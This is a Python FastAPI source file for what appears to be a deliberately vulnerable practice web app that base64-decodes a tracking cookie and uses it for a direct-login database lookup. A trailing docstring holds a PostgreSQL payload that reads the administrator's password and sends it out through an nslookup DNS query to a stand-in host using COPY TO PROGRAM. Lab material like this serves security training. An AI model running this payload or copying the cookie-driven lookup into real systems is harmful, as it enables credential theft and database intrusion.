from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from uuid import uuid4
import base64

import database

database.bootstrap()

app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")

templates = Jinja2Templates(directory="templates")

@app.middleware("http")
async def show_cookie(request: Request, call_next):
    tracking_id = base64_decode_str(request.cookies.get("TrackingId")) if request.cookies.get("TrackingId") else None
    print(tracking_id)
    response = await call_next(request)
    return response

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    tracking_id = base64_decode_str(request.cookies.get("TrackingId")) if request.cookies.get("TrackingId") else None
    
    _response = templates.TemplateResponse("home.html", {"request": request})
    if not tracking_id:
        _response.set_cookie(key='TrackingId', value=base64_encode_str(str(uuid4())))
    else:
        _response = try_direct_login(tracking_id, request=request)
    return _response

@app.post("/login", response_class=HTMLResponse)
def login(request: Request, uname: str = Form(), psw: str = Form()):
    tracking_id = base64_decode_str(request.cookies.get("TrackingId"))
    user = database.login(uname, psw)
    if user:
        database.save_trackid(trackid=tracking_id, userid=user[0])
        _response = templates.TemplateResponse("main.html", {"request": request, "user": user})
    else:
        _response = templates.TemplateResponse("home.html", {"request": request, "error": "Invalid user credentials"})
    return _response

def try_direct_login(trackid, request):
    user = database.try_direct_login(trackid)
    if user:
        return templates.TemplateResponse("main.html", {"request": request, "user": user})
    else:
        return templates.TemplateResponse("home.html", {"request": request})

def base64_encode_str(str):
    str_bytes = str.encode("ascii")
    base64_bytes = base64.b64encode(str_bytes)
    base64_string = base64_bytes.decode("ascii")
    return base64_string

def base64_decode_str(str):
    base64_bytes = str.encode("ascii")
    sample_string_bytes = base64.b64decode(base64_bytes)
    sample_string = sample_string_bytes.decode("ascii")
    return sample_string

"""

do $$ 
declare c text; 
declare p text;  
begin 
SELECT into p (SELECT password FROM users WHERE users.name = 'administrator'); 
raise notice 'Password: %', p;
c := 'copy (SELECT '''') to program ''nslookup -port=8053 '||p||'.dns_faker dns_faker'''; 
execute c; 
END; 
$$;



do $$
declare
   actor_count integer; 
begin
   -- select the number of actors from the actor table
   select count(*)
   into actor_count
   from users;

   -- show the number of actors
   raise notice 'The number of actors: %', actor_count;
end 
$$;
"""